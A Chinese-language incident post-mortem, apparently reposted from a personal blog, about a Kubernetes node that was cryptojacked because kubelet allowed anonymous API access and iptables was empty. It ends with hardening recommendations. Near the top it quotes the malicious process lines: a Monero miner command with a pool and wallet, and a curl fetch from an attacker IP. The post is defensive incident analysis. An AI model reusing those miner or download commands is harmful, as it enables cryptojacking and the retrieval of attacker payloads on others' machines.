
---
title: '记一次Kubernetes集群被入侵，服务器变矿机'
categories: 
 - 编程
 - Dockone
 - 周报
headimg: 'https://cors.zfour.workers.dev/?http://dockone.io/uploads/article/20210914/53796790fbf624e54423921f6ecb7bf4.png'
author: Dockone
comments: false
date: 2021-09-21 01:53:39
thumbnail: 'https://cors.zfour.workers.dev/?http://dockone.io/uploads/article/20210914/53796790fbf624e54423921f6ecb7bf4.png'
---

<div>   
<br>近期遇到了一次我们自建Kubernetes集群中某台机器被入侵挖矿的情况，后续也找到了原因，所幸只是用来挖矿……<br>
<br>网络安全是个严肃的问题，它总是在不经意间出现，等你反应过来却已经迟了。希望各位读者看完后也有所启发，去检查及加固自己的集群。<br>
<h3>入侵现象</h3>检查到某台机器中出现了异常进程：<br>
<pre class="prettyprint">./.system -o pool.supportxmr.com:3333 --donate-level=1 --coin=monero -u 46EPFzvnX5GH61ejkPpNcRNm8kVjs8oHS9VwCkKRCrJX27XEW2y1NPLfSa54DGHxqnKfzDUVW1jzBfekk3hrCVCm<br>
curl -s http://45.9.148.35/scan_threads.dat<br>
</pre><br>
<div class="aw-upload-img-list active">
<a href="http://dockone.io/uploads/article/20210914/53796790fbf624e54423921f6ecb7bf4.png" target="_blank" data-fancybox-group="thumb" rel="lightbox"><img src="https://cors.zfour.workers.dev/?http://dockone.io/uploads/article/20210914/53796790fbf624e54423921f6ecb7bf4.png" class="img-polaroid" title="1.png" alt="1.png" referrerpolicy="no-referrer"></a>
</div>
<br>
简单来讲，就是我们的机器被用来挖矿了……<br>
<br>问题出现后，我们第一时间关闭了Docker，其实应该隔离下环境，把挖矿程序dump下来，以便后续分析。<br>
<h3>具体原因排查</h3><h4>iptables为空</h4>出现了异常进程，肯定是被入侵了，我首先看的是<code class="prettyprint">iptables</code>。果不其然，机器上的iptables规则是空的，意味着这台机器在裸奔。<br>
<h4>kubelet裸奔</h4>内部同事提出了有可能是kubelet被入侵的问题，检查过其他组件后，开始检查kubelet组件。<br>
<br>最后检查到kubelet日志中有异常：<br>
<div class="aw-upload-img-list active">
<a href="http://dockone.io/uploads/article/20210914/0833eeb7ce153a3ee07f6f8d527808f9.png" target="_blank" data-fancybox-group="thumb" rel="lightbox"><img src="https://cors.zfour.workers.dev/?http://dockone.io/uploads/article/20210914/0833eeb7ce153a3ee07f6f8d527808f9.png" class="img-polaroid" title="2.png" alt="2.png" referrerpolicy="no-referrer"></a>
</div>
<br>
<h4>kubelet设置不当</h4>确认入侵问题，kubelet参数设置错误，允许直接访问kubelet的API。<br>
<div class="aw-upload-img-list active">
<a href="http://dockone.io/uploads/article/20210914/c9bfa777e94730ab8c6128a02b8525c7.png" target="_blank" data-fancybox-group="thumb" rel="lightbox"><img src="https://cors.zfour.workers.dev/?http://dockone.io/uploads/article/20210914/c9bfa777e94730ab8c6128a02b8525c7.png" class="img-polaroid" title="3.png" alt="3.png" referrerpolicy="no-referrer"></a>
</div>
<br>
发现是kubelet的启动项中，该位置被注释掉：<br>
<div class="aw-upload-img-list active">
<a href="http://dockone.io/uploads/article/20210914/974e190b8b12b473056bbbaf89054ce0.png" target="_blank" data-fancybox-group="thumb" rel="lightbox"><img src="https://cors.zfour.workers.dev/?http://dockone.io/uploads/article/20210914/974e190b8b12b473056bbbaf89054ce0.png" class="img-polaroid" title="4.png" alt="4.png" referrerpolicy="no-referrer"></a>
</div>
<br>
然后文件中禁止匿名访问的配置没有读取。<br>
<div class="aw-upload-img-list active">
<a href="http://dockone.io/uploads/article/20210914/56eb8d71e8c7d64c879eb9c0fe132829.png" target="_blank" data-fancybox-group="thumb" rel="lightbox"><img src="https://cors.zfour.workers.dev/?http://dockone.io/uploads/article/20210914/56eb8d71e8c7d64c879eb9c0fe132829.png" class="img-polaroid" title="5.png" alt="5.png" referrerpolicy="no-referrer"></a>
</div>
<br>
该项配置是由于我操作不当注释掉的。<br>
<br>由于是新增加的机器，当晚就发现了问题，整个集群是我在管理的，我跟随着一起排查，所以很快就找到了原因，当晚我就把其他机器中的配置项重新扫了一遍，假如它们的防火墙失效了，也会有类似的入侵情况发生，还好此次事件控制在1台机器中。<br>
<h3>改进方案</h3>其实该问题理论上讲是可以避免的，是因为出现了多层漏洞才会被有心人扫到，我从外到内整理了一下可能改进的策略：<br>
<ol><li>机器防火墙设置，机器防火墙是整个系统最外层，即使机器的防火墙同步失败，也不能默认开放所有端口，而是应该全部关闭，等待管理员连接到tty终端上检查。</li><li>使用机器时，假如机器不是暴露给外部使用的，公网IP可有可无的时候，尽量不要有公网IP，我们的机器才上线1天就被扫描到了漏洞，可想而知，公网上是多么的危险。</li><li>使用kubelet以及其他系统服务时，端口监听方面是不是该有所考量？能不能不监听<code class="prettyprint">0.0.0.0</code>，而是只监听本机的内网IP。</li><li>使用kubelet以及其他程序，设计或是搭建系统时，对于匿名访问时的权限控制，我们需要考虑到假如端口匿名会出现什么问题，是否应该允许匿名访问，如果不允许匿名访问，那么怎么做一套鉴权系统？</li><li>系统管理员操作时，是否有一个比较规范化的流程，是不是该只使用脚本操作线上环境？手动操作线上环境带来的问题并不好排查和定位。</li></ol><br>
<br>我这里不是抛出疑问，只是想告诉大家，考虑系统设计时，有必要考虑下安全性。<br>
<h3>总结</h3>发生了入侵事件后，同事开玩笑说，还好没其他经济损失，要不我可能要回家了。作为集群的管理员，只有自己最清楚问题的严重程度，从本质上来讲，问题已经相当严重了。入侵者相当于拥有了机器上Docker的完整控制权限。<br>
<br>因为此次事件的发生，不只是我，还有SA的同学基本都被diao了一遍，心里还是有点难受的，希望大家能对网络安全问题有所重视，从加固防火墙开始，避免监听不必要的端口，这两项至少是最容易实现的。<br>
<br>原文链接：<a href="https://corvo.myseu.cn/2021/03/23/2021-03-" rel="nofollow" target="_blank">https://corvo.myseu.cn/2021/03/23/2021-03-23-</a>记一次Kubernetes中严重的安全问题/，作者：corvofeng
                                                                <div class="aw-upload-img-list">
                                                                                                                                                                                                                                                                                                                                                                                                </div>
                                
                                                                <ul class="aw-upload-file-list">
                                                                                                                                                                                                                                                                                                                                                                                                                                            </ul>
                                                              
</div>
            